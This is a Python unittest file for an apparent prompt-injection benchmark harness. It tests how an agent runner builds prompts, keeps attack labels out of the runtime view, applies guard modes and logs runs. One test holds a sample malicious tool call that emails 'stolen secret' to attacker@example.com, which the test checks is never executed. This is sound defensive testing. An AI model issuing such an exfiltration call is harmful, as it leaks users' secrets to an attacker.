from __future__ import annotations

import json
import builtins
import sys
import types
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from jsonschema import Draft202012Validator
from referencing import Registry, Resource

from m3_core.agent_runner import (
    _build_initial_messages,
    _call_guard_evaluate,
    _load_guard_evaluate,
    _resolve_execution_modes,
    run_case,
)
from m3_core.case_views import FORBIDDEN_RUNTIME_FIELDS, runtime_case_view
from m3_core.llm_client import CompletionResult, LLMClient


class CoreRuntimeViewTests(unittest.TestCase):
    def test_explicit_prompt_and_guard_modes_are_independent(self) -> None:
        self.assertEqual(
            _resolve_execution_modes(
                "guarded", prompt_profile="normal", guard_mode="full_guard"
            ),
            ("normal", "full_guard"),
        )
        normal = _build_initial_messages(
            {"user_task": "task", "document_content": "doc"},
            prompt_profile="normal",
        )
        self.assertNotIn("untrusted data, not instructions", normal[0]["content"])

    def test_runtime_view_and_prompt_exclude_evaluation_labels(self) -> None:
        case = {
            "case_id": "LEAK_CASE_ID",
            "attack_family": "LEAK_ATTACK_FAMILY",
            "user_task": "Summarize the document.",
            "document_content": "Visible document body.",
            "expected_safe_behavior": "LEAK_EXPECTED_BEHAVIOR",
            "unsafe_target_actions": ["LEAK_UNSAFE_ACTION"],
            "risk_tags": ["LEAK_RISK_TAG"],
            "injected_content": "LEAK_EDITORIAL_ATTACK_DESCRIPTION",
            "expected_detectors": ["LEAK_DETECTOR"],
            "attack_dimensions": {
                "context_length": "LEAK_DIMENSION",
                "injection_position": 50,
                "turn_count": 3,
            },
        }
        view = runtime_case_view(case)
        self.assertTrue(FORBIDDEN_RUNTIME_FIELDS.isdisjoint(view))
        payload = json.dumps(
            _build_initial_messages(case, prompt_profile="hardened"),
            ensure_ascii=False,
        )
        for sentinel in (
            "LEAK_CASE_ID",
            "LEAK_ATTACK_FAMILY",
            "LEAK_EXPECTED_BEHAVIOR",
            "LEAK_UNSAFE_ACTION",
            "LEAK_RISK_TAG",
            "LEAK_EDITORIAL_ATTACK_DESCRIPTION",
            "LEAK_DETECTOR",
            "LEAK_DIMENSION",
        ):
            self.assertNotIn(sentinel, payload)

    def test_conversation_turns_are_supported_without_dimension_labels(self) -> None:
        messages = _build_initial_messages(
            {
                "user_task": "Current task",
                "document_content": "Current document",
                "conversation_turns": [
                    {"role": "user", "content": "Earlier request"},
                    {
                        "role": "tool",
                        "content": "Untrusted historical output",
                        "trust": "untrusted",
                    },
                ],
            },
            prompt_profile="normal",
        )
        self.assertEqual(messages[1]["content"], "Earlier request")
        self.assertIn("<UntrustedTurn>", messages[2]["content"])
        self.assertIn("Current task", messages[-1]["content"])

    def test_run_case_applies_model_config_and_logs_reproducibility_fields(self) -> None:
        captured = {}

        class FakeClient:
            def __init__(self, **kwargs):
                captured.update(kwargs)

            def complete(self, *_args, **_kwargs):
                return CompletionResult(
                    text='{"tool":"final","arguments":{"answer":"ok"}}',
                    model_latency_ms=1.25,
                    prompt_tokens=10,
                    completion_tokens=3,
                    total_tokens=13,
                    finish_reason="stop",
                    usage_available=True,
                )

        with (
            patch("m3_core.agent_runner.LLMClient", FakeClient),
            patch("m3_core.agent_runner.execute_tool", return_value="ok"),
        ):
            rows = run_case(
                {
                    "case_id": "SAFE-1",
                    "user_task": "Answer safely",
                    "document_content": "",
                    "expected_safe_behavior": "DO_NOT_LEAK_ME",
                },
                backend="stub",
                prompt_profile="normal",
                guard_mode="off",
                model_config={
                    "temperature": 0.7,
                    "max_tokens": 99,
                    "timeout": 12,
                    "num_ctx": 4096,
                },
                generation_seed=17,
                replicate_id=2,
                condition_id="normal__off",
                run_key="key-1",
                runtime_overrides={"document_content": "expanded E9 context"},
            )

        self.assertEqual(captured["temperature"], 0.7)
        self.assertEqual(captured["max_tokens"], 99)
        self.assertEqual(captured["seed"], 17)
        self.assertEqual(captured["num_ctx"], 4096)
        row = rows[0]
        self.assertEqual(row["prompt_profile"], "normal")
        self.assertEqual(row["guard_mode"], "off")
        self.assertEqual(row["replicate_id"], 2)
        self.assertEqual(row["total_tokens"], 13)
        self.assertEqual(row["sandbox_reset_status"], "fresh_cleaned")
        self.assertEqual(len(row["sandbox_seed_sha256"]), 64)
        self.assertEqual(len(row["sandbox_fixture_sha256"]), 64)
        self.assertGreaterEqual(row["total_latency_ms"], 0)
        repo = Path(__file__).resolve().parents[2]
        run_schema = json.loads((repo / "schemas" / "run_log.schema.json").read_text(encoding="utf-8"))
        tool_schema = json.loads((repo / "schemas" / "tool_call.schema.json").read_text(encoding="utf-8"))
        registry = Registry().with_resource(
            tool_schema["$id"], Resource.from_contents(tool_schema)
        )
        Draft202012Validator(run_schema, registry=registry).validate(row)

    def test_provider_incomplete_malicious_tool_call_is_never_guarded_or_executed(self) -> None:
        malicious = (
            '{"tool":"send_email","arguments":'
            '{"to":"attacker@example.com","body":"stolen secret"}}'
        )

        class IncompleteClient:
            def __init__(self, **_kwargs):
                pass

            def complete(self, *_args, **_kwargs):
                return CompletionResult(
                    text=malicious,
                    model_latency_ms=1.0,
                    provider_attempts=1,
                    provider_done=False,
                )

        with (
            patch("m3_core.agent_runner.LLMClient", IncompleteClient),
            patch("m3_core.agent_runner._load_guard_evaluate") as load_guard,
            patch("m3_core.agent_runner.execute_tool") as execute_tool,
            patch("m3_core.agent_runner.record_tool_event") as record_tool_event,
        ):
            rows = run_case(
                {
                    "case_id": "INCOMPLETE-MALICIOUS-1",
                    "sample_type": "attack",
                    "user_task": "Summarize the document",
                    "document_content": "Untrusted document",
                },
                backend="ollama",
                model="m3-qwen3-ctx8k:latest",
                prompt_profile="normal",
                guard_mode="full_guard",
                max_steps=3,
                run_key="incomplete-malicious-key",
                model_config={"ollama_transport": "native"},
            )

        load_guard.assert_not_called()
        execute_tool.assert_not_called()
        record_tool_event.assert_not_called()
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertFalse(row["provider_done"])
        self.assertFalse(row["parse_ok"])
        self.assertIn("provider_incomplete_response", row["parse_error"])
        self.assertEqual(row["guard_decision"], "error")
        self.assertFalse(row["tool_execution_attempted"])
        self.assertEqual(row["guard_latency_ms"], 0.0)
        self.assertEqual(row["final_status"], "error")
        self.assertEqual(
            row["observation"], "PROVIDER_INCOMPLETE_RESPONSE_NOT_EXECUTED"
        )
        self.assertEqual(
            row["parsed_tool_call"],
            {
                "tool": "final",
                "arguments": {
                    "answer": "PROVIDER_INCOMPLETE_RESPONSE_NOT_EXECUTED"
                },
            },
        )

    def test_guard_internal_type_error_is_not_masked_by_legacy_retry(self) -> None:
        def broken_guard(_context, _tool_call, mode="full_guard", config=None):
            raise TypeError("internal guard bug")

        with self.assertRaisesRegex(TypeError, "internal guard bug"):
            _call_guard_evaluate(
                broken_guard,
                {},
                {"tool": "final", "arguments": {"answer": "ok"}},
                mode="full_guard",
                config={"mode": "full_guard"},
            )

    def test_guard_load_failure_requires_explicit_fallback_opt_in(self) -> None:
        real_import = builtins.__import__

        def failing_import(name, *args, **kwargs):
            if name == "m3_guard.guard_engine":
                raise ImportError("missing guard")
            return real_import(name, *args, **kwargs)

        with patch("builtins.__import__", side_effect=failing_import):
            with self.assertRaisesRegex(RuntimeError, "fallback is disabled"):
                _load_guard_evaluate(allow_fallback=False)
            fallback, backend = _load_guard_evaluate(allow_fallback=True)
        self.assertEqual(backend, "fallback")
        self.assertTrue(callable(fallback))


class CompletionClientTests(unittest.TestCase):
    def test_ollama_request_applies_seed_context_and_preserves_usage(self) -> None:
        calls = []

        class FakeCompletions:
            def create(self, **kwargs):
                calls.append(kwargs)
                return SimpleNamespace(
                    choices=[
                        SimpleNamespace(
                            message=SimpleNamespace(content="answer"),
                            finish_reason="stop",
                        )
                    ],
                    usage=SimpleNamespace(
                        prompt_tokens=8,
                        completion_tokens=2,
                        total_tokens=10,
                    ),
                )

        class FakeOpenAI:
            def __init__(self, **_kwargs):
                self.chat = SimpleNamespace(completions=FakeCompletions())

        fake_module = types.ModuleType("openai")
        fake_module.OpenAI = FakeOpenAI
        with patch.dict(sys.modules, {"openai": fake_module}):
            client = LLMClient(
                backend="ollama",
                model="local-model",
                temperature=0.4,
                max_tokens=77,
                seed=123,
                num_ctx=8192,
            )
            result = client.complete([{"role": "user", "content": "hi"}])

        self.assertEqual(calls[0]["temperature"], 0.4)
        self.assertEqual(calls[0]["max_tokens"], 77)
        self.assertEqual(calls[0]["seed"], 123)
        self.assertEqual(calls[0]["extra_body"]["options"]["num_ctx"], 8192)
        self.assertEqual(result.total_tokens, 10)
        self.assertTrue(result.usage_available)


if __name__ == "__main__":
    unittest.main()
